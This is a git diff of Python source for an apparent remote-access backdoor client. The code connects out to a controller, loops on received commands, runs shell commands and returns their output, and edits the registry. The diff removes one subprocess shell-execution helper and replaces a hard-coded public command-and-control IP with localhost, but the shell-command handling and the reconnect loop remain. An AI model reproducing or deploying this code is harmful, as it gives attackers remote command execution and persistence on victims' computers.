@@ -50,18 +50,6 @@ def start_regitry_edit():
         print("Error : %s"%(str(ee)))
         return False
 
-def process_shell_cmd(s):
-    try:
-        shell_cmd = s.recv(1024).decode()
-        pipe = subprocess.Popen(shell_cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
-        output = pipe.stdout.read()
-        s.send("DONE".encode())
-        sleep(1)
-        s.send(output)
-        return
-    except:
-        s.send("FAILED".encode())
-
 def start_session(s):
     while True:
         try:
@@ -111,9 +99,6 @@ def start_session(s):
 
             if "CHECK" in cmd:
                 s.send("YES".encode())
-
-            if "GETSHELL" in cmd:
-                process_shell_cmd(s)
 
             if "shell" in cmd:
                 cmd = cmd.strip("shell ")
@@ -165,11 +150,13 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(("157.230.12.188",2003))
+            s.connect(("127.0.0.1",2003))
+            #print("Connected")
             conn_process = Thread(target=start_session,args=(s,))
             conn_process.start()
             conn_process.join()
         except socket.error:
+            #print("Attempting to reconnect...")
             main()
         except:
             print("Unknown error occured")
